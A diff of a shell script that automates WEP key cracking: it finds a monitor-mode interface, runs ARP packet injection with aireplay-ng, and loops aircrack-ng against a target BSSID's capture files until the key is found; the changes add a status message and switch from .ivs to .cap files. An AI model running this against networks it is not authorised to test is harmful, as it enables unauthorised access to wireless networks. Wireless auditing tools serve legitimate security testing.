@@ -40,6 +40,7 @@ iwconfig ${INTERFACE} # mon0
 # Get the monitor interface name (assumed to be the last one    #
 #################################################################
 MON=`iwconfig 2>/dev/null | grep mon | tail -1 | awk '{ print $1; }'`
+echo "MESSAGE: Using monitor interface ${MON}"
 
 #################################################################
 # GET INTERFACE MAC ADDRESS
@@ -103,7 +104,7 @@ xterm -title "ARP injection" -e "aireplay-ng -2 -r arp-packet ${MON}" & AIREPLAY
 #################################################################
 while true
 do
-	aircrack-ng -b ${BSSID} *.ivs
+	aircrack-ng -b ${BSSID} *.cap
 	echo -n "MESSAGE: Did you get the key?: (y or no)"
   	read -e CONFIRM
  	case $CONFIRM in
